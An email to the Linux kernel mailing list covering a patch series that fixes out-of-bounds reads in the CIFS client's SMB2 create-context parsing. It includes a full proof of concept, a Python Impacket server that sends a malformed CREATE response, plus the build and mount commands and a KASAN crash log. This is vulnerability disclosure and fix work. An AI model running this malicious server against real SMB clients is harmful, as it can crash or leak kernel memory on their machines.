Received: from mail-pj2-f40.google.com (mail-pj2-f40.google.com [74.125.227.168])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 71F7236F90C
	for <linux-cifs@vger.kernel.org>; Sat, 26 Sep 2026 06:49:47 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.168
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790405389; cv=none; b=ogEFb/ti2hI6gwVRgOA28jFLvCe3IRGlSXtG4LwpMBwmGG1fHPgPHLyOABQhykA4vETkdtMFY5AgtKzcRk76VoF/OX1ZkwGKbgjt9oSiQI25L8C2HDdZ+f4sgyHzt4FucCdGZ2OzKwnmzGY6wAvSC+LjQu30tZoZxbiagbCaQuQ=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790405389; c=relaxed/simple;
	bh=knFEYMAiUbM87GbM+U6atWR/qzDV3EY7UqWd7rZDTXE=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=SOWGCKztuW03mMdj9NasNfvWOXTeHl6a64mpXefyljIu43fFPmRfeKkRtNjr0tgPhz8Vw3+BEVmxOGG3NpiOjTH4ijamdauVe/8Z5pMaZY1OPv+mEvgx9L1Tniqmwgp8TJxfBe2kBc88xfNoPzkKCnJbN07L1CLVZg3pbIS5h6k=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=lHr1AhC9; arc=none smtp.client-ip=74.125.227.168
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="lHr1AhC9"
Received: by mail-pj2-f40.google.com with SMTP id 98e67ed59e1d1-3a0e7cbb608so46712a91.2
        for <linux-cifs@vger.kernel.org>; Fri, 25 Sep 2026 23:49:47 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790405387; x=1791010187; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=fGbWb9eT+OkMAQugR9zdah42mDdfvWRdk4pZc1pdR1A=;
        b=lHr1AhC9EpIN2+bfXMlsSqp8/7QfpJ0CVxISyihX8kVtOPnW7NwOO7CwpeUDZmh1X3
         06ee6SaR39z7P9ynTTAi1iJy0+FRuu/CHzkA5i15j8S9BHGHEmaSv5RKAuIrYV4U7Lnh
         SUEdpkE0Dl+WFLF3sfFXsPRYxCSetl1xVP9jWZSF07GdA9fXGPILKqOoTDdAytmPiJ1Y
         5uc48ZcjvVjAxTD/nAcNpIJu+7j1cB6ZtHutL4P3gPsY24S7RS1wYFU39KelOKOs437t
         TVxamz9M7BxWcVuuOlD8YyxWeryDPOmdF+dsEiiLAHUgLOZ20RLr9RbvjlciiEyaq7u7
         +WeQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790405387; x=1791010187;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=fGbWb9eT+OkMAQugR9zdah42mDdfvWRdk4pZc1pdR1A=;
        b=tVmCswm6KOLVh4UtvfULZ1XzCDzJJXQB+G/UPIKIrjn0oa7qqFvw5Me2+oGl9a0Ich
         lbJRWbQpLAEmz4Ybsy2QqOT4vMzinVP4JoKlPq+aWWeVzH8KMmAnbkvbrQbaEzEWLxSI
         V12MpZiqYBWWVzryzNVBTbAgCmeE/cx8U4OUc+Xvok9gOJpAunkMHZQ0+oy0ZRTsH4Jj
         eu1PeE669jtlbmpA9Oj3NTZfZ/8hrOopX5/pmWkVmrwM7YgMYVnVTJMMihjeN9330fzf
         RSXSQJnyQjvO42Vo5IYZ3Hp4zgKs6Op1FTIo1eZi1Up1Vz6iDNwqlIOgxjTvrWIL5kL2
         bsQw==
X-Forwarded-Encrypted: i=1; AKwUvBzrtxKUw2tQoPtrdA+tsWg/Llf1QGLqtnjYtcilZz2NhERoOxJjL5usSqMtkLR4G5Ff4hYrfsfb1EtY@vger.kernel.org
X-Gm-Message-State: AFuF++kET+Ectx5PchKTslC3xky+a4GzPQS0x9o4FVJ1QHcRvUBhIBGL
	vp4EAyzPakuyLQ/tkyFhstdyAwlKcI3hsGbtn1Uqp6Q+XrZPF+5QDjgqndvCNqu3XkZR
X-Gm-Gg: AYBFou06YliV4RABKZkVXvvTvX3vvF/VnrNZl92JKN+tJB0MSArszNbroSpLd+Uq99Q
	eL7FjoAZrV0XyrS0fpSw7IuIctU9JB7re2yzI97gGJ38Gx3nx2uq+U2DZpYuM5lSq8tLRUCILkh
	MAFUwXX+Md5mn14IYUWmCX9h934HKuZ4EsD1UN63uNokcAsiiWCXluCUm58vG9x2vlNdswgY7u5
	o80QArhS9AEbneuCGQFr9O4q8cgHtYVmmRkHoHctLnr1xAQsGBSM9IFW0w3Y4jXEsmFJASL0eAd
	uywYVyIedCLGdB8+I8bwMW7r7iH5iMKUtJbzo1P1oIGO/0dHtWaROB9CNBa19j/S18Gx1gOYHRA
	O/MLrQG44GDdkGUQwKxZ071RJeVjeRAYi2b7ktQidVI9FuWxdukCQ+WLW20lNAagwA/JtDPbVqO
	DbORXoZCnQuCKj9u0q15l1RIVpheWMWJ7LQLhXDhBhKjpuj2FemVbf6F+JSq3uegHV275RsrFMl
	3THnTizIJjEVjZ6u/mvFLuZv1hjFg==
X-Received: by 2002:a17:90b:4cc2:b0:3a0:e22b:1b2a with SMTP id 98e67ed59e1d1-3a0e22b1d7fmr561931a91.32.1790405386252;
        Fri, 25 Sep 2026 23:49:46 -0700 (PDT)
Received: from 954df21a5119.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a0b498fb12sm3447327a91.0.2026.09.25.23.49.38
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 25 Sep 2026 23:49:45 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: sfrench@samba.org
Cc: zihanx@nebusec.ai,
	pc@manguebit.org,
	ronniesahlberg@gmail.com,
	sprasad@microsoft.com,
	tom@talpey.com,
	bharathsm@microsoft.com,
	pshilovsky@samba.org,
	aaptel@suse.com,
	pali@kernel.org,
	linux-cifs@vger.kernel.org,
	samba-technical@lists.samba.org,
	linux-kernel@vger.kernel.org,
	stable@vger.kernel.org
Subject: [PATCH v5 0/6] smb: client: fix create context out-of-bounds reads
Date: Sat, 26 Sep 2026 06:49:20 +0000
Message-ID: <cover.1790398755.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: linux-cifs@vger.kernel.org
List-Id: <linux-cifs.vger.kernel.org>
List-Subscribe: <mailto:linux-cifs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-cifs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in fs/smb/client/smb2pdu.c. A malicious
SMB server can send a malformed SMB2 CREATE response to a CIFS client and
trigger an out-of-bounds read. We validated this with an Impacket server on
the QEMU host and a root CIFS client in the guest; CIFS does not set
FS_USERNS_MOUNT, so the mount must run as root. For valid SMB responses,
the series preserves existing request handling. No impact was observed in
the tested CIFS mount/read path; a full filesystem regression suite was not
run.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

smb2_parse_contexts() validates the complete create-context area but does
not limit each context record to its Next field before dispatching it. A
malformed chain can therefore allow a handler to read bytes beyond the
current context. The QFid handler also cast the context to a full response
structure without verifying that DataLength covered DiskFileId, so a
truncated QFid context could read past the response allocation. A
non-terminal Next that does not leave a complete following context header
is rejected as malformed.

The parser rejects NameOffset and DataOffset values before the context
header, bounds the name range by the current record with checked arithmetic,
and dispatches known handlers only when DataLength is non-zero.

The SMB2/SMB3 lease parsers also read LeaseState and LeaseFlags at
canonical offsets rather than from DataOffset. Patch 1 limits each record
to Next, reads QFid data only when its payload covers DiskFileId, and
parses lease data from DataOffset with the exact v1/v2 lease payload sizes.
A size mismatch skips lease parsing without failing the open. These sizes
match the fixed payload sizes used by the CIFS request builders and
ksmbd; a future extension must update the parser explicitly.

parse_posix_ctxt() reads nlink, reparse_tag, and mode before checking that
the POSIX data contains them. The in-tree smb2_open_file() path passes a
NULL posix pointer, so ordinary opens do not reach this handler. Patch 2
still checks the handler's minimum data length and preserves soft failure
for malformed optional metadata.

Tracing the parser callers and compound error paths through cleanup and
return-value handling also exposed the additional independent issues fixed
by patches 3 through 6.

After a successful CREATE, SMB2_open() increments num_remote_opens before
parsing its contexts. Patch 3 calls SMB2_close() after a parsing failure.
SMB2_close() decrements num_remote_opens only after a confirmed successful
close response. If a close is interrupted or transport fails, the existing
best-effort behavior retains conservative accounting when the remote result
is unknown.

open_cached_dir() sends CREATE and QUERY_INFO as a compound request. Patch
4 validates the CREATE response before using its fields, records the CREATE
FIDs, marks the handle open, and increments the remote-open count before
processing later-command errors. It also handles -EREMCHG before response
validation, so a missing response does not hide the reconnect request.
Patch 5 marks earlier completed mids as cancelled when a later compound
wait is interrupted or MID synchronization or state validation fails. It
keeps their response buffers attached until synchronization is complete, so
the existing cancelled-mid cleanup can inspect each successful CREATE and
queue SMB2_close(). The remote-open count is incremented only after close
work allocation succeeds and before queueing it, so an OOM does not leave
an unmatched count. It marks smb2_unlink()'s create+close compound so it
is not closed again. Non-CREATE responses and compounds with a close keep
their existing behavior.

Patch 6 preserves a create-context parsing error in the
SMB2_OP_OPEN_QUERY compound path while later responses are processed.

The series keeps separate Fixes tags for the independent root causes, with
each tag pointing to the earliest commit that introduced its root cause.

The parser changes overlap with Frank Sorenson's related bounds-checking
patch for smb2_parse_contexts():
https://lore.kernel.org/all/20260826153147.4112943-12-sorenson@redhat.com/
This series incorporates the NameOffset, Next, and zero-data dispatch checks
while retaining the stricter per-record successor-header validation and the
handler-specific payload checks.

The reproducer uses an Impacket SMB server that modifies the SMB2 CREATE
response. packetdrill is not used because it cannot implement the required
stateful SMB server or rewrite this response.

Reproducer:

From the PoC directory:

    gcc -O2 -static -o poc poc.c
    chmod +x poc.sh
    ./poc

The wrapper starts the Impacket server on the host at tcp/4445. The
validation uses QEMU user-mode networking (`-netdev user`), so no
additional veth, network namespace, or TCP proxy is needed. Configure the
guest interface and route as follows:

    ip link set eth0 up
    ip addr add 10.0.2.15/24 dev eth0
    ip route add default via 10.0.2.2

Then, as root in the guest, mount the share and read the trigger file:

    mkdir -p /mnt/test
    mount -t cifs //10.0.2.2/SHARE /mnt/test \
        -o user=,password=,vers=2.0,sec=ntlmssp,port=4445,noperm,soft
    cat /mnt/test/probe >/dev/null

The C wrapper execs ./poc.sh, so poc.sh must retain its executable bit (or
be made executable with chmod +x as shown). On first use, the wrapper
creates a virtual environment and installs Impacket 0.13.1. The initial
setup requires network access to the configured package index; an existing
virtual environment needs no installation.
The guest-side mount is shown separately because CIFS does not set
FS_USERNS_MOUNT; the validated mount/read commands run as root in the
guest.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
------BEGIN poc.c------
#include <stdio.h>
#include <unistd.h>

int main(int argc, char **argv)
{
	(void)argc;
	argv[0] = "./poc.sh";
	execv(argv[0], argv);
	perror("execv ./poc.sh");
	return 127;
}
------END poc.c--------

------BEGIN poc.sh------
#!/bin/bash
set -euo pipefail

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
VENV_DIR="$SCRIPT_DIR/.venv-impacket"

if [[ ! -x "$VENV_DIR/bin/python" ]]; then
    python3 -m venv "$VENV_DIR"
    "$VENV_DIR/bin/pip" install impacket==0.13.1
fi

exec "$VENV_DIR/bin/python" "$SCRIPT_DIR/poc.py" "$@"
------END poc.sh--------

------BEGIN poc.py------
#!/usr/bin/env python3
import logging
import signal
import struct
from pathlib import Path

from impacket import smbserver
from impacket import smb3structs as smb2
from impacket.nt_errors import STATUS_SUCCESS


PORT = 4445
SHARE_NAME = "SHARE"
TARGET_NAME = "probe"
TARGET_OFFSET = 424
CONTEXT = struct.pack("<IHHHHI4s4x", 0, 16, 4, 0, 24, 0, b"QFid")
ALIGN_PAD = b"\x00" * (TARGET_OFFSET - 152)


def prepare_share(share_dir: Path) -> None:
    share_dir.mkdir(parents=True, exist_ok=True)
    (share_dir / "placeholder").touch()
    (share_dir / TARGET_NAME).write_bytes(b"x")


def main() -> None:
    base_dir = Path(__file__).resolve().parent
    share_dir = base_dir / "share"
    prepare_share(share_dir)

    logging.basicConfig(level=logging.INFO, format="%(levelname)s:%(message)s")

    original = smbserver.SMB2Commands.smb2Create

    def malicious_smb2_create(conn_id, smb_server, recv_packet):
        req = smb2.SMB2Create(recv_packet["Data"])
        raw_name = req["Buffer"][: req["NameLength"]]
        name = smbserver.normalize_path(raw_name.decode("utf-16le"))

        commands, packets, error = original(conn_id, smb_server, recv_packet)
        print(f"CREATE name={name!r} err=0x{error:08x}", flush=True)

        if error == STATUS_SUCCESS and name == TARGET_NAME:
            resp = commands[0]
            resp["CreateContextsOffset"] = TARGET_OFFSET
            resp["CreateContextsLength"] = len(CONTEXT)
            resp["AlignPad"] = ALIGN_PAD
            resp["Buffer"] = CONTEXT
            print(
                f"injected truncated QFid context; packet_len={64 + len(resp.getData())}",
                flush=True,
            )

        return commands, packets, error

    smbserver.SMB2Commands.smb2Create = staticmethod(malicious_smb2_create)

    server = smbserver.SimpleSMBServer(listenAddress="0.0.0.0", listenPort=PORT)
    server.setSMB2Support(True)
    server.addShare(SHARE_NAME, str(share_dir), readOnly="yes")
    server.setLogFile("/dev/stdout")

    print(f"Serving //10.0.2.2/{SHARE_NAME} on tcp/{PORT}", flush=True)
    print("Trigger file: probe", flush=True)

    signal.signal(signal.SIGTERM, lambda _sig, _frame: (_ for _ in ()).throw(SystemExit(0)))
    try:
        server.start()
    except (KeyboardInterrupt, SystemExit):
        pass


if __name__ == "__main__":
    main()
------END poc.py--------

The following excerpt is from the output of
scripts/decode_stacktrace.sh when run on the unpatched baseline log. The
command used was:

    ./scripts/decode_stacktrace.sh vmlinux source-tree < baseline.log

The excerpt below is the resulting output.
----BEGIN crash log----
[ 1344.780735] [  T11242] ==================================================================
[ 1344.780750] [  T11242] BUG: KASAN: slab-out-of-bounds in smb2_parse_contexts (fs/smb/client/smb2pdu.c:3337)
[ 1344.780838] [  T11242] Read of size 8 at addr ff1100007e4b3180 by task cat/11242

[ 1344.780880] [  T11242] CPU: 0 UID: 0 PID: 11242 Comm: cat Not tainted 7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
[ 1344.780887] [  T11242] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 1344.780907] [  T11242] Call Trace:
[ 1344.780918] [  T11242]  <TASK>
[ 1344.780925] [  T11242]  dump_stack_lvl (lib/dump_stack.c:88)
[ 1344.780980] [  T11242]  print_report (mm/kasan/report.c:288 (discriminator 1) mm/kasan/report.c:376 (discriminator 1) mm/kasan/report.c:482 (discriminator 1))
[ 1344.781004] [  T11242]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:3337)
[ 1344.781009] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781030] [  T11242]  ? __virt_addr_valid (arch/x86/mm/physaddr.c:55)
[ 1344.781052] [  T11242]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:3337)
[ 1344.781057] [  T11242]  kasan_report (mm/kasan/report.c:640)
[ 1344.781065] [  T11242]  ? smb2_parse_contexts (fs/smb/client/smb2pdu.c:3337)
[ 1344.781077] [  T11242]  smb2_parse_contexts (fs/smb/client/smb2pdu.c:3337)
[ 1344.781085] [  T11242]  ? _raw_spin_unlock (include/asm-generic/qspinlock.h:128 (discriminator 4) include/linux/spinlock.h:205 (discriminator 4) include/linux/spinlock_api_smp.h:168 (discriminator 4) kernel/locking/spinlock.c:190 (discriminator 4))
[ 1344.781101] [  T11242]  SMB2_open (fs/smb/client/smb2pdu.c:3344)
[ 1344.781107] [  T11242]  ? cifsConvertToUTF16 (fs/smb/client/cifs_unicode.c:419 fs/smb/client/cifs_unicode.c:491)
[ 1344.781129] [  T11242]  ? __pfx_SMB2_open+0x10/0x10
[ 1344.781135] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781139] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781145] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781149] [  T11242]  ? __kmalloc_noprof (arch/x86/include/asm/atomic.h:23 include/linux/atomic/atomic-arch-fallback.h:457 include/linux/jump_label.h:248 mm/slab.h:458 mm/slub.c:4558 mm/slub.c:5392)
[ 1344.781164] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781167] [  T11242]  ? cifs_strndup_to_utf16 (fs/smb/client/cifs_unicode.c:628)
[ 1344.781184] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781206] [  T11242]  ? cifs_convert_path_to_utf16 (fs/smb/client/smb2misc.c:457)
[ 1344.781211] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781216] [  T11242]  ? __pfx_cifs_convert_path_to_utf16+0x10/0x10
[ 1344.781226] [  T11242]  ? smb2_open_file (fs/smb/client/smb2file.c:184)
[ 1344.781231] [  T11242]  smb2_open_file (fs/smb/client/smb2file.c:184)
[ 1344.781242] [  T11242]  ? __pfx_smb2_open_file+0x10/0x10
[ 1344.781247] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781250] [  T11242]  ? __lock_acquire+0x45c/0x25f0
[ 1344.781278] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781291] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781295] [  T11242]  ? __asan_memcpy (mm/kasan/shadow.c:105 (discriminator 1))
[ 1344.781316] [  T11242]  cifs_open (fs/smb/client/file.c:1155 (discriminator 2))
[ 1344.781354] [  T11242]  ? __pfx_cifs_open+0x10/0x10
[ 1344.781359] [  T11242]  ? do_sys_openat2 (include/linux/file.h:164 fs/open.c:1364)
[ 1344.781373] [  T11242]  ? do_syscall_64 (include/linux/irq-entry-common.h:207 include/linux/irq-entry-common.h:238 include/linux/entry-common.h:328 arch/x86/entry/syscall_64.c:100)
[ 1344.781409] [  T11242]  ? kasan_quarantine_put (arch/x86/include/asm/irqflags.h:158 (discriminator 1) mm/kasan/quarantine.c:234 (discriminator 1))
[ 1344.781413] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781417] [  T11242]  ? lockdep_hardirqs_on+0x7b/0x110
[ 1344.781463] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781469] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781485] [  T11242]  ? bpf_trampoline_6442634119+0x9f/0xed
[ 1344.781503] [  T11242]  ? do_dentry_open (fs/open.c:915)
[ 1344.781510] [  T11242]  do_dentry_open (fs/open.c:915)
[ 1344.781515] [  T11242]  ? __pfx_cifs_open+0x10/0x10
[ 1344.781521] [  T11242]  ? cifs_permission (fs/smb/client/cifsfs.c:432 (discriminator 1))
[ 1344.781537] [  T11242]  vfs_open (fs/open.c:1098)
[ 1344.781541] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781549] [  T11242]  path_openat (fs/namei.c:5179)
[ 1344.781572] [  T11242]  ? __pfx_path_openat+0x10/0x10
[ 1344.781581] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781584] [  T11242]  ? __lock_acquire+0x45c/0x25f0
[ 1344.781594] [  T11242]  do_file_open (fs/namei.c:4901)
[ 1344.781601] [  T11242]  ? __pfx_do_file_open+0x10/0x10
[ 1344.781606] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781627] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781631] [  T11242]  ? alloc_fd (fs/file.c:1297)
[ 1344.781651] [  T11242]  ? do_getname+0x6b/0x2d0
[ 1344.781658] [  T11242]  do_sys_openat2 (include/linux/file.h:164 fs/open.c:1364)
[ 1344.781663] [  T11242]  ? __pfx_do_sys_openat2+0x10/0x10
[ 1344.781666] [  T11242]  ? __pfx___do_sys_newfstat+0x10/0x10
[ 1344.781683] [  T11242]  __x64_sys_openat (fs/open.c:1389)
[ 1344.781691] [  T11242]  ? __pfx___x64_sys_openat+0x10/0x10
[ 1344.781698] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781702] [  T11242]  ? rcu_is_watching (include/linux/context_tracking.h:128 kernel/rcu/tree.c:752)
[ 1344.781713] [  T11242]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:381)
[ 1344.781717] [  T11242]  ? do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/entry/syscall_64.c:94)
[ 1344.781723] [  T11242]  do_syscall_64 (include/linux/irq-entry-common.h:207 include/linux/irq-entry-common.h:238 include/linux/entry-common.h:328 arch/x86/entry/syscall_64.c:100)
[ 1344.781728] [  T11242]  ? irqentry_exit (include/linux/irq-entry-common.h:507 include/linux/irq-entry-common.h:550 kernel/entry/common.c:164)
[ 1344.781735] [  T11242]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:150)
[ 1344.781740] [  T11242] RIP: 0033:0x7fc594192687
[ 1344.781757] [  T11242] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
All code
========
   0:	48 89 fa             	mov    %rdi,%rdx
   3:	4c 89 df             	mov    %r11,%rdi
   6:	e8 58 b3 00 00       	call   0xb363
   b:	8b 93 08 03 00 00    	mov    0x308(%rbx),%edx
  11:	59                   	pop    %rcx
  12:	5e                   	pop    %rsi
  13:	48 83 f8 fc          	cmp    $0xfffffffffffffffc,%rax
  17:	74 1a                	je     0x33
  19:	5b                   	pop    %rbx
  1a:	c3                   	ret
  1b:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  22:	00 
  23:	48 8b 44 24 10       	mov    0x10(%rsp),%rax
  28:	0f 05                	syscall
  2a:*	5b                   	pop    %rbx		<-- trapping instruction
  2b:	c3                   	ret
  2c:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  33:	83 e2 39             	and    $0x39,%edx
  36:	83 fa 08             	cmp    $0x8,%edx
  39:	75 de                	jne    0x19
  3b:	e8 23 ff ff ff       	call   0xffffffffffffff63

Code starting with the faulting instruction
===========================================
   0:	5b                   	pop    %rbx
   1:	c3                   	ret
   2:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   9:	83 e2 39             	and    $0x39,%edx
   c:	83 fa 08             	cmp    $0x8,%edx
   f:	75 de                	jne    0xffffffffffffffef
  11:	e8 23 ff ff ff       	call   0xffffffffffffff39
[ 1344.781761] [  T11242] RSP: 002b:00007ffc7d27b080 EFLAGS: 00000202 ORIG_RAX: 0000000000000101
[ 1344.781773] [  T11242] RAX: ffffffffffffffda RBX: 00007fc594100780 RCX: 00007fc594192687
[ 1344.781776] [  T11242] RDX: 0000000000000000 RSI: 00007ffc7d27be31 RDI: ffffffffffffff9c
[ 1344.781778] [  T11242] RBP: 0000000000000001 R08: 0000000000000000 R09: 0000000000000000
[ 1344.781780] [  T11242] R10: 0000000000000000 R11: 0000000000000202 R12: 000056239611ba00
[ 1344.781782] [  T11242] R13: 00007ffc7d27b3c0 R14: 0000000000000000 R15: 0000000000040000
[ 1344.781814] [  T11242]  </TASK>

[ 1344.781876] [  T11242] Allocated by task 11240:
[ 1344.781885] [  T11242]  kasan_save_stack (mm/kasan/common.c:58)
[ 1344.781894] [  T11242]  kasan_save_track (mm/kasan/common.c:70 (discriminator 1) mm/kasan/common.c:79 (discriminator 1))
[ 1344.781900] [  T11242]  __kasan_slab_alloc (mm/kasan/common.c:463 (discriminator 1))
[ 1344.781905] [  T11242]  kmem_cache_alloc_noprof (mm/slub.c:4510 mm/slub.c:4886 mm/slub.c:4917)
[ 1344.781911] [  T11242]  mempool_alloc_noprof (mm/mempool.c:608)
[ 1344.781925] [  T11242]  cifs_small_buf_get (fs/smb/client/misc.c:237 (discriminator 2))
[ 1344.781931] [  T11242]  allocate_buffers (fs/smb/client/connect.c:654)
[ 1344.781938] [  T11242]  cifs_demultiplex_thread (fs/smb/client/connect.c:1287)
[ 1344.781943] [  T11242]  kthread (kernel/kthread.c:880)
[ 1344.781958] [  T11242]  ret_from_fork (arch/x86/kernel/process.c:196 (discriminator 1))
[ 1344.781973] [  T11242]  ret_from_fork_asm (arch/x86/entry/entry_64.S:258)

[ 1344.781996] [  T11242] The buggy address belongs to the object at ff1100007e4b2fc0
which belongs to the cache cifs_small_rq of size 448
[ 1344.782002] [  T11242] The buggy address is located 0 bytes to the right of
allocated 448-byte region [ff1100007e4b2fc0, ff1100007e4b3180)

[ 1344.782011] [  T11242] The buggy address belongs to the physical page:
[ 1344.782025] [  T11242] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0xff1100007e4b34c0 pfn:0x7e4b0
[ 1344.782036] [  T11242] head: order:2 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[ 1344.782045] [  T11242] flags: 0xfff00000000240(workingset|head|node=0|zone=1|lastcpupid=0x7ff)
[ 1344.782056] [  T11242] page_type: f5(slab)
[ 1344.782069] [  T11242] raw: 00fff00000000240 ff11000105b8edc0 ffd400000418d610 ff11000105b90948
[ 1344.782075] [  T11242] raw: ff1100007e4b34c0 0000000800190013 00000000f5000000 0000000000000000
[ 1344.782080] [  T11242] head: 00fff00000000240 ff11000105b8edc0 ffd400000418d610 ff11000105b90948
[ 1344.782085] [  T11242] head: ff1100007e4b34c0 0000000800190013 00000000f5000000 0000000000000000
[ 1344.782089] [  T11242] head: 00fff00000000002 ffffffffffffff01 00000000ffffffff 00000000ffffffff
[ 1344.782094] [  T11242] head: ffffffffffffffff 0000000000000000 00000000ffffffff 0000000000000004
[ 1344.782098] [  T11242] page dumped because: kasan: bad access detected
[ 1344.782111] [  T11242] page_owner tracks the page as allocated
[ 1344.782643] [  T11242] page last allocated via order 2, migratetype Unmovable, gfp_mask 0xd2800(GFP_NOWAIT|__GFP_NORETRY|__GFP_COMP|__GFP_NOMEMALLOC), pid 10789, tgid 10789 (umount), ts 770745347902, free_ts 770742186938
[ 1344.784632] [  T11242]  post_alloc_hook (mm/page_alloc.c:2232 mm/page_alloc.c:2259)
[ 1344.784658] [  T11242]  get_page_from_freelist (mm/page_alloc.c:1738 mm/page_alloc.c:1904 mm/page_alloc.c:3234 mm/page_alloc.c:3410 mm/page_alloc.c:3945)
[ 1344.784668] [  T11242]  __alloc_frozen_pages_noprof (include/linux/gfp.h:272 (discriminator 1) include/linux/gfp.h:287 (discriminator 1))
[ 1344.784677] [  T11242]  alloc_pages_mpol+0x14a/0x440
[ 1344.784697] [  T11242]  new_slab (mm/slub.c:1604)
[ 1344.784712] [  T11242]  ___slab_alloc (mm/slub.c:4448)
[ 1344.784722] [  T11242]  kmem_cache_alloc_noprof (arch/x86/include/asm/preempt.h:95 (discriminator 1) mm/slub.c:4771 (discriminator 1) mm/slub.c:4883 (discriminator 1) mm/slub.c:4950 (discriminator 1))
[ 1344.784731] [  T11242]  mempool_alloc_noprof (mm/mempool.c:608)
[ 1344.784741] [  T11242]  cifs_small_buf_get (fs/smb/client/misc.c:237 (discriminator 2))
[ 1344.784751] [  T11242]  __smb2_plain_req_init (fs/smb/client/smb2pdu.c:565)
[ 1344.784761] [  T11242]  SMB2_tdis (fs/smb/client/smb2pdu.c:3097)
[ 1344.784772] [  T11242]  cifs_put_tcon (fs/smb/client/connect.c:2911 (discriminator 1))
[ 1344.784781] [  T11242]  cifs_put_tlink (arch/x86/include/asm/bitops.h:202 arch/x86/include/asm/bitops.h:232 include/asm-generic/bitops/instrumented-non-atomic.h:142 fs/smb/client/connect.c:2905)
[ 1344.784790] [  T11242]  cifs_umount (fs/smb/client/connect.c:4010 (discriminator 1))
[ 1344.784799] [  T11242]  deactivate_locked_super (fs/super.c:485)
[ 1344.784821] [  T11242]  cleanup_mnt (include/linux/llist.h:283 (discriminator 5) fs/namespace.c:1325 (discriminator 5))
